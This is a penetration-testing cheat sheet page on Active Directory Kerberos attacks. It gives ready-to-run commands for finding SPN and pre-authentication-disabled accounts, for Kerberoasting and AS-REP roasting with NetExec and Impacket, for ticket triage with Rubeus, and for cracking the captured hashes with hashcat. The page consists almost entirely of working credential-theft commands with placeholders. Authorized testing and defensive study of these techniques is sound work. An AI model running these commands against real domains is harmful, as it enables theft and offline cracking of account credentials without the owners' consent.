# Kerberos

<span class="ol-search-aliases">kerberoast asrep roast as-rep tgs spn kerberos rubeus GetUserSPNs GetNPUsers</span>

SPNs, roasting candidates, tickets and common Kerberos discovery.

<div class="ol-section-kicker"><span>AD</span></div>

## PowerView SPN users

```powershell
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
```

**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user · **Noise:** Moderate


## NetExec Kerberoasting

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast.txt
```

**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user · **Noise:** Moderate


## Impacket Kerberoast

```bash
GetUserSPNs.py '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

**Tool:** Impacket · **Platform:** Linux/macOS · **Context:** Domain user · **Noise:** Moderate


## PowerView AS-REP candidates

```powershell
Get-DomainUser -PreauthNotRequired | Select samaccountname
```

**Tool:** PowerView · **Platform:** Windows · **Context:** Domain user · **Noise:** Moderate


## NetExec AS-REP roasting

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --asreproast asrep.txt
```

**Tool:** NetExec · **Platform:** Linux/macOS · **Context:** Domain user · **Noise:** Moderate


## Impacket AS-REP roasting

```bash
GetNPUsers.py '<DOMAIN>/' -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat -outputfile asrep.txt
```

**Tool:** Impacket · **Platform:** Linux/macOS · **Context:** No auth · **Noise:** Moderate


## List Windows Kerberos tickets

```cmd
klist
```

**Tool:** klist · **Platform:** Windows · **Context:** Domain user · **Noise:** Moderate


## Rubeus ticket triage

```cmd
Rubeus.exe triage
```

**Tool:** Rubeus · **Platform:** Windows · **Context:** Domain user · **Noise:** Moderate


## Hashcat Kerberoast etype 23

```bash
hashcat -m 13100 kerberoast.txt <WORDLIST>
```

**Tool:** hashcat · **Platform:** Cross-platform · **Context:** Domain user · **Noise:** Moderate


## Hashcat AS-REP etype 23

```bash
hashcat -m 18200 asrep.txt <WORDLIST>
```

**Tool:** hashcat · **Platform:** Cross-platform · **Context:** Domain user · **Noise:** Moderate

---

**Related:** [Overview](./) · [Gpo](gpo.md) · [Laps Gmsa](laps-gmsa.md)
